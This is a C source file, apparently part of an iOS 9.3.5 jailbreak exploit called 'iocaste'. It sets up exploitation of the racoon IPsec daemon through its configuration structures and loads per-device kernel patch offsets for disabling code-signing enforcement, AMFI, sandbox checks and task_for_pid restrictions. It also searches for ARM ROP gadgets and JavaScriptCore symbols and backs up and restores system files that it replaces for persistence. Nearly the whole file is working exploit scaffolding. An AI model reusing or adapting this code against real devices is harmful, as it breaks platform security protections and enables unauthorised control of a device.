#include "util.h"
#include "gadget_finder.h"
#include "iocaste.h"

iocaste_ctx_t *iocaste = NULL;

static int iocaste_init_offsets(void) {
    uint32_t libdispatch_size = 0;
    uint8_t *libdispatch_data = load_file("/usr/lib/system/introspection/libdispatch.dylib", &libdispatch_size);
    if (libdispatch_data == NULL) {
        fprintf(stderr, "[-] failed to load libdispatch.dylib\n");
        return -1;
    }

    struct mach_header *hdr = (struct mach_header *)libdispatch_data;
    struct load_command *load_cmd = (struct load_command *)(hdr + 1);
    struct linkedit_data_command linkedit = {0};
    bool found_signature = false;

    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        if (load_cmd->cmd == LC_CODE_SIGNATURE) {
            memcpy(&linkedit, load_cmd, sizeof(struct linkedit_data_command));
            found_signature = true;
            break;
        }
        load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
    }

    munmap(libdispatch_data, libdispatch_size);
    if (!found_signature || linkedit.dataoff == 0) {
        fprintf(stderr, "[-] failed to find libdispatch.dylib code signature\n");
        return -1;
    }

    iocaste->offsets.csblob.file_size = libdispatch_size;
    iocaste->offsets.csblob.file_offset = linkedit.dataoff;
    iocaste->offsets.csblob.signature_size = linkedit.datasize;

    iocaste->offsets.data_view.array_buffer = 0x10;
    iocaste->offsets.data_view.byte_length = 0x14;
    iocaste->offsets.data_view.mode = 0x18;

    iocaste->offsets.racoon.isakmp_cfg_addr = 0xB6C08;
    iocaste->offsets.racoon.lcconf_addr = 0xB6088;
    iocaste->offsets.racoon.dns4_arr = 0x8;
    iocaste->offsets.racoon.lcconf_counter = 0xA0;
    iocaste->offsets.racoon.dns4_to_lcconf = (-((iocaste->offsets.racoon.isakmp_cfg_addr + iocaste->offsets.racoon.dns4_arr) - iocaste->offsets.racoon.lcconf_addr));

    uint32_t version[3] = {0};
    get_ios_version(&version[0]);
    if (version[0] != 9 || version[1] != 3 || version[2] < 5) {
        fprintf(stderr, "[-] unsupported iOS version\n");
        return -1;
    }

    char model[128] = {0};
    size_t size = sizeof(model)-1;
    sysctlbyname("hw.machine", model, &size, NULL, 0);

    for (uint32_t i = 0; i < 25; i++) {
        if (strcmp(global_kernel_offsets[i].model, model) == 0 && global_kernel_offsets[i].version[2] == version[2]) {
            iocaste->offsets.kernel.i_can_has_kernel_configuration_got = global_kernel_offsets[i].i_can_has_kernel_configuration_got;
            iocaste->offsets.kernel.lwvm_jump = global_kernel_offsets[i].lwvm_jump;
            iocaste->offsets.kernel.proc_enforce = global_kernel_offsets[i].proc_enforce;
            iocaste->offsets.kernel.cs_enforcement_disable = global_kernel_offsets[i].cs_enforcement_disable;
            iocaste->offsets.kernel.PE_i_can_has_debugger_1 = global_kernel_offsets[i].PE_i_can_has_debugger_1;
            iocaste->offsets.kernel.PE_i_can_has_debugger_2 = global_kernel_offsets[i].PE_i_can_has_debugger_2;
            iocaste->offsets.kernel.p_bootargs = global_kernel_offsets[i].p_bootargs;
            iocaste->offsets.kernel.vm_fault_enter = global_kernel_offsets[i].vm_fault_enter;
            iocaste->offsets.kernel.vm_map_enter = global_kernel_offsets[i].vm_map_enter;
            iocaste->offsets.kernel.vm_map_protect = global_kernel_offsets[i].vm_map_protect;
            iocaste->offsets.kernel.mount_patch = global_kernel_offsets[i].mount_patch;
            iocaste->offsets.kernel.sb_call_i_can_has_debugger = global_kernel_offsets[i].sb_call_i_can_has_debugger;
            iocaste->offsets.kernel.csops = global_kernel_offsets[i].csops;
            iocaste->offsets.kernel.amfi_file_check_mmap = global_kernel_offsets[i].amfi_file_check_mmap;
            iocaste->offsets.kernel.sbops = global_kernel_offsets[i].sbops;
            iocaste->offsets.kernel.tfp0_patch = global_kernel_offsets[i].tfp0_patch;
            break;
        }
    }

    if (iocaste->offsets.kernel.sbops == 0) {
        fprintf(stderr, "[-] failed to find kernel offsets\n");
        return -1;
    }
    return 0;
}

static int iocaste_init_dsc(void) {
    iocaste->dsc.info = dyld_cache_init();
    if (iocaste->dsc.info == NULL) {
        fprintf(stderr, "[-] failed to load dyld_shared_cache\n");
        return -1;
    }

    uint32_t cpu_family = 0;
    size_t size = sizeof(cpu_family);
    sysctlbyname("hw.cpufamily", &cpu_family, &size, NULL, 0);

    iocaste->dsc.region_base = 0x20000000;
    iocaste->dsc.region_size = 0x20000000;
    iocaste->dsc.remap_base = (cpu_family == CPUFAMILY_ARM_SWIFT) ? 0x60000000 : 0x40000000;
    iocaste->dsc.remap_size = iocaste->dsc.info->mappings[0].size;

    uint32_t rw_mapping_start = iocaste->dsc.info->mappings[1].virt_addr;
    uint32_t rw_mapping_end = rw_mapping_start + iocaste->dsc.info->mappings[1].size;
    uint32_t ro_mapping_start = iocaste->dsc.info->mappings[2].virt_addr;
    uint32_t ro_mapping_end = ro_mapping_start + iocaste->dsc.info->mappings[2].size;
    iocaste->dsc.max_slide = (iocaste->dsc.region_size - (ro_mapping_end - iocaste->dsc.region_base)) & ~0xfff;
    return 0;
}

static int iocaste_init_stages(void) {
    iocaste->stage1.stack_base = (0x1c0000 + 0x10);
    iocaste->stage1.stack_base += (iocaste->stage1.stack_base % 0x8);

    addr_converter_t converter = {.addr = iocaste->stage1.stack_base};
	for (uint32_t i = 0; i < sizeof(converter.buf);i++) {
		if (converter.buf[i] == '"') {
			converter.addr += 0x8;
			i = 0;
		}
	}

    iocaste->stage1.stack_base = converter.addr;
    iocaste->stage2.stack_base = 0x12000000;
    iocaste->stage2.stack_varibles = iocaste->stage2.stack_base + 0x100;
    iocaste->stage2.stack_strings = iocaste->stage2.stack_varibles + 0x1000;
    iocaste->stage2.stack_size = 0x80000;
    iocaste->stage3.mapping_base = 0x13000000;
    iocaste->stage3.mapping_size = 0x20000;
    return 0;
}

static int iocaste_init_gadgets(void) {
    if (find_js_syscall_v2() != 0) {
        if (find_js_syscall_v1() != 0) return -1;
    }

    if ((iocaste->gadgets.pop_lr_pc = find_pop_lr_pc()) == 0) return -1;
    if ((iocaste->gadgets.ldr_r1_r2_mov_r2_r9_bx_r3 = find_ldr_r1_r2_mov_r2_r9_bx_r3()) == 0) return -1;
    if ((iocaste->gadgets.pop_r4_r7_pc = find_pop_r4_r7_pc()) == 0) return -1;
    if ((iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc = find_pop_r0_r1_r2_r3_r4_pc()) == 0) return -1;
    if ((iocaste->gadgets.pop_r4_r5_r6_r7_pc = find_pop_r4_r5_r6_r7_pc()) == 0) return -1;
    if ((iocaste->gadgets.svc_0x80_bx_lr = find_svc_0x80_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.str_r0_r3_bx_lr = find_str_r0_r3_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.pop_r2_r3_r7_pc = find_pop_r2_r3_r7_pc()) == 0) return -1;
    if ((iocaste->gadgets.ldr_r0_r2_bx_lr = find_ldr_r0_r2_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.add_r0_r2_bx_lr = find_add_r0_r2_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.str_r0_r2_bx_lr = find_str_r0_r2_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.str_r2_r3_bx_lr = find_str_r2_r3_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.add_r0_r1_bx_lr = find_add_r0_r1_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.pop_r0_r1_pc = find_pop_r0_r1_pc()) == 0) return -1;
    if ((iocaste->gadgets.str_r0_r1_bx_lr = find_str_r0_r1_bx_lr()) == 0) return -1;
    if ((iocaste->gadgets.pop_r12_pc = find_pop_r12_pc()) == 0) return -1;
    if ((iocaste->gadgets.rop_start = find_rop_start()) == 0) return -1;
    return 0;
}

static int iocaste_init_symbols(void) {
    if ((iocaste->symbols.longjump = find_longjmp()) == 0) return -1;
    if ((iocaste->symbols.syscall = find_syscall()) == 0) return -1;
    if ((iocaste->symbols.dlopen = find_dlopen()) == 0) return -1;
    if ((iocaste->symbols.strlcpy = find_strlcpy()) == 0) return -1;
    if ((iocaste->symbols.strlcpy_lazy_ptr = find_strlcpy_lazy_ptr()) == 0) return -1;
    if ((iocaste->symbols.JSGlobalContextCreate = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSGlobalContextCreate")) == 0) return -1;
    if ((iocaste->symbols.JSContextGetGlobalObject = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSContextGetGlobalObject")) == 0) return -1;
    if ((iocaste->symbols.JSStringCreateWithUTF8CString = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSStringCreateWithUTF8CString")) == 0) return -1;
    if ((iocaste->symbols.JSObjectMakeFunctionWithCallback = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSObjectMakeFunctionWithCallback")) == 0) return -1;
    if ((iocaste->symbols.JSObjectSetProperty = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSObjectSetProperty")) == 0) return -1;
    if ((iocaste->symbols.JSObjectGetProperty = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSObjectGetProperty")) == 0) return -1;
    if ((iocaste->symbols.JSValueToObject = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSValueToObject")) == 0) return -1;
    if ((iocaste->symbols.JSValueMakeNumber = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSValueMakeNumber")) == 0) return -1;
    if ((iocaste->symbols.JSObjectCallAsConstructor = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSObjectCallAsConstructor")) == 0) return -1;
    if ((iocaste->symbols.JSObjectMakeArray = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSObjectMakeArray")) == 0) return -1;
    if ((iocaste->symbols.JSEvaluateScript = dyld_cache_find_symbol(iocaste->dsc.info, JSC_PATH, "_JSEvaluateScript")) == 0) return -1;
    return 0;
}

void iocaste_deinit(void) {
    if (iocaste == NULL) return;
    if (iocaste->dsc.info != NULL) {
        dyld_cache_deinit(iocaste->dsc.info);
    }

    bzero(iocaste, sizeof(iocaste_ctx_t));
    free(iocaste);
    iocaste = NULL;
}

int iocaste_init(void) {
    iocaste = calloc(1, sizeof(iocaste_ctx_t));
    if (iocaste == NULL) return -1;

    if (iocaste_init_offsets() != 0) goto err;
    if (iocaste_init_dsc() != 0) goto err;
    if (iocaste_init_stages() != 0) goto err;
    
    if (iocaste_init_gadgets() != 0) {
        fprintf(stderr, "[-] failed to find rop gadgets\n");
        goto err;
    }

    if (iocaste_init_symbols() != 0) {
        fprintf(stderr, "[-] failed to find symbols\n");
        goto err;
    }

#if 0
    printf("[*] offsets:\n");
    printf("      racoon->isakmp_cfg_addr: 0x%x\n", iocaste->offsets.racoon.isakmp_cfg_addr);
    printf("      racoon->lcconf_addr: 0x%x\n", iocaste->offsets.racoon.lcconf_addr);
    printf("      racoon->dns4_arr: 0x%x\n", iocaste->offsets.racoon.dns4_arr);
    printf("      racoon->lcconf_counter: 0x%x\n", iocaste->offsets.racoon.lcconf_counter);
    printf("      racoon->dns4_to_lcconf: 0x%x\n", iocaste->offsets.racoon.dns4_to_lcconf);
    printf("      data_view->array_buffer: 0x%x\n", iocaste->offsets.data_view.array_buffer);
    printf("      data_view->byte_length: 0x%x\n", iocaste->offsets.data_view.byte_length);
    printf("      data_view->mode: 0x%x\n", iocaste->offsets.data_view.mode);
    printf("      csblob->file_size: 0x%x\n", iocaste->offsets.csblob.file_size);
    printf("      csblob->file_offset: 0x%x\n", iocaste->offsets.csblob.file_offset);
    printf("      csblob->signature_size: 0x%x\n", iocaste->offsets.csblob.signature_size);
    printf("\n\n");

    printf("[*] stages:\n");
    printf("      stage1->stack_base: 0x%x\n", iocaste->stage1.stack_base);
    printf("      stage2->stack_varibles: 0x%x\n", iocaste->stage2.stack_varibles);
    printf("      stage2->stack_strings: 0x%x\n", iocaste->stage2.stack_strings);
    printf("      stage2->stack_size: 0x%x\n", iocaste->stage2.stack_size);
    printf("      stage3->mapping_base: 0x%x\n", iocaste->stage3.mapping_base);
    printf("      stage3->mapping_size: 0x%x\n", iocaste->stage3.mapping_size);
    printf("\n\n");

    printf("[*] dyld_shared_cache:\n");
    printf("      max_slide: 0x%x\n", iocaste->dsc.max_slide);
    printf("      region_base: 0x%x\n", iocaste->dsc.region_base);
    printf("      region_size: 0x%x\n", iocaste->dsc.region_size);
    printf("      remap_base: 0x%x\n", iocaste->dsc.remap_base);
    printf("      remap_size: 0x%x\n", iocaste->dsc.remap_size);
    printf("\n\n");

    printf("[*] gadgets\n");
    printf("      pop_r4_r7_pc: 0x%x\n", iocaste->gadgets.pop_r4_r7_pc);
    printf("      pop_r0_r1_r2_r3_r4_pc: 0x%x\n", iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc);
    printf("      pop_r4_r5_r6_r7_pc: 0x%x\n", iocaste->gadgets.pop_r4_r5_r6_r7_pc);
    printf("      ldr_r1_r2_mov_r2_r9_bx_r3: 0x%x\n", iocaste->gadgets.ldr_r1_r2_mov_r2_r9_bx_r3);
    printf("      svc_0x80_bx_lr: 0x%x\n", iocaste->gadgets.svc_0x80_bx_lr);
    printf("      str_r0_r3_bx_lr: 0x%x\n", iocaste->gadgets.str_r0_r3_bx_lr);
    printf("      pop_r2_r3_r7_pc: 0x%x\n", iocaste->gadgets.pop_r2_r3_r7_pc);
    printf("      ldr_r0_r2_bx_lr: 0x%x\n", iocaste->gadgets.ldr_r0_r2_bx_lr);
    printf("      add_r0_r2_bx_lr: 0x%x\n", iocaste->gadgets.add_r0_r2_bx_lr);
    printf("      str_r0_r2_bx_lr: 0x%x\n", iocaste->gadgets.str_r0_r2_bx_lr);
    printf("      str_r2_r3_bx_lr: 0x%x\n", iocaste->gadgets.pop_r4_r7_pc);
    printf("      add_r0_r1_bx_lr: 0x%x\n", iocaste->gadgets.add_r0_r1_bx_lr);
    printf("      pop_r0_r1_pc: 0x%x\n", iocaste->gadgets.pop_r0_r1_pc);
    printf("      str_r0_r1_bx_lr: 0x%x\n", iocaste->gadgets.str_r0_r1_bx_lr);
    printf("      pop_r12_pc: 0x%x\n", iocaste->gadgets.pop_r12_pc);
    printf("      pop_lr_pc: 0x%x\n", iocaste->gadgets.pop_lr_pc);
    printf("      rop_start: 0x%x\n", iocaste->gadgets.rop_start);
    printf("      syscall->version: 0x%x\n", iocaste->gadgets.syscall.version);
    printf("      syscall->gadget1: 0x%x\n", iocaste->gadgets.syscall.gadget1);
    printf("      syscall->gadget2: 0x%x\n", iocaste->gadgets.syscall.gadget2);
    printf("      syscall->gadget3: 0x%x\n", iocaste->gadgets.syscall.gadget3);
    printf("      syscall->gadget4: 0x%x\n", iocaste->gadgets.syscall.gadget4);
    printf("      syscall->gadget5: 0x%x\n", iocaste->gadgets.syscall.gadget5);
    printf("      syscall->orig_lr: 0x%x\n", iocaste->gadgets.syscall.orig_lr);
    printf("\n\n");

    printf("[*] symbols:\n");
    printf("      dlopen: 0x%x\n", iocaste->symbols.dlopen);
    printf("      longjump: 0x%x\n", iocaste->symbols.longjump);
    printf("      syscall: 0x%x\n", iocaste->symbols.syscall);
    printf("      strlcpy: 0x%x\n", iocaste->symbols.strlcpy);
    printf("      strlcpy_lazy_ptr: 0x%x\n", iocaste->symbols.strlcpy_lazy_ptr);
    printf("      JSGlobalContextCreate: 0x%x\n", iocaste->symbols.JSGlobalContextCreate);
    printf("      JSContextGetGlobalObject: 0x%x\n", iocaste->symbols.JSContextGetGlobalObject);
    printf("      JSStringCreateWithUTF8CString: 0x%x\n", iocaste->symbols.JSStringCreateWithUTF8CString);
    printf("      JSObjectMakeFunctionWithCallback: 0x%x\n", iocaste->symbols.JSObjectMakeFunctionWithCallback);
    printf("      JSObjectSetProperty: 0x%x\n", iocaste->symbols.JSObjectSetProperty);
    printf("      JSObjectGetProperty: 0x%x\n", iocaste->symbols.JSObjectGetProperty);
    printf("      JSValueToObject: 0x%x\n", iocaste->symbols.JSValueToObject);
    printf("      JSValueMakeNumber: 0x%x\n", iocaste->symbols.JSValueMakeNumber);
    printf("      JSObjectCallAsConstructor: 0x%x\n", iocaste->symbols.JSObjectCallAsConstructor);
    printf("      JSObjectMakeArray: 0x%x\n", iocaste->symbols.JSObjectMakeArray);
    printf("      JSEvaluateScript: 0x%x\n", iocaste->symbols.JSEvaluateScript);
    printf("\n\n");
#endif
    return 0;

err:
    iocaste_deinit();
    return -1;
}

int iocaste_create_backup(void) {
    if (access("/var/root/iocaste/backup", F_OK) == 0) return 0;
    mkdir("/var/root/iocaste/backup", 0777);
    chown("/var/root/iocaste/backup", 0, 0);
    if (access("/var/root/iocaste/backup", F_OK) != 0) return -1;

    copy_file("/etc/racoon/racoon.conf", "/var/root/iocaste/backup/racoon.conf");
    copy_file("/etc/dhcpd.conf", "/var/root/iocaste/backup/dhcpd.conf");
    copy_file("/usr/libexec/wifiFirmwareLoader", "/var/root/iocaste/backup/wifiFirmwareLoader");
    copy_file("/System/Library/LaunchDaemons/com.apple.SpringBoard.plist", "/var/root/iocaste/backup/com.apple.SpringBoard.plist");
    sync_volume("/private/var");
    return 0;
}

int iocaste_restore_backup(void) {
    if (access("/var/root/iocaste/backup/racoon.conf", F_OK) == 0) {
        remove_at_path("/etc/racoon/racoon.conf");
        copy_file("/var/root/iocaste/backup/racoon.conf", "/etc/racoon/racoon.conf");
    }

    if (access("/var/root/iocaste/backup/dhcpd.conf", F_OK) == 0) {
        remove_at_path("/etc/dhcpd.conf");
        copy_file("/var/root/iocaste/backup/dhcpd.conf", "/etc/dhcpd.conf");
    }

    if (access("/var/root/iocaste/backup/wifiFirmwareLoader", F_OK) == 0) {
        remove_at_path("/usr/libexec/wifiFirmwareLoader");
        remove_at_path("/usr/libexec/wifiFirmwareLoader_orig");
        copy_file("/var/root/iocaste/backup/wifiFirmwareLoader", "/usr/libexec/wifiFirmwareLoader");
    } else if (access("/usr/libexec/wifiFirmwareLoader_orig", F_OK) == 0) {
        remove_at_path("/usr/libexec/wifiFirmwareLoader");
        move_file("/usr/libexec/wifiFirmwareLoader_orig", "/usr/libexec/wifiFirmwareLoader", true);
    }

    if (access("/var/root/iocaste/backup/com.apple.SpringBoard.plist", F_OK) == 0) {
        remove_at_path("/System/Library/LaunchDaemons/com.apple.SpringBoard.plist");
        remove_at_path("/Library/LaunchDaemons/com.apple.SpringBoard.plist");
        copy_file("/var/root/iocaste/backup/com.apple.SpringBoard.plist", "/System/Library/LaunchDaemons/com.apple.SpringBoard.plist");
    }

    sync_volume("/");
    return 0;
}
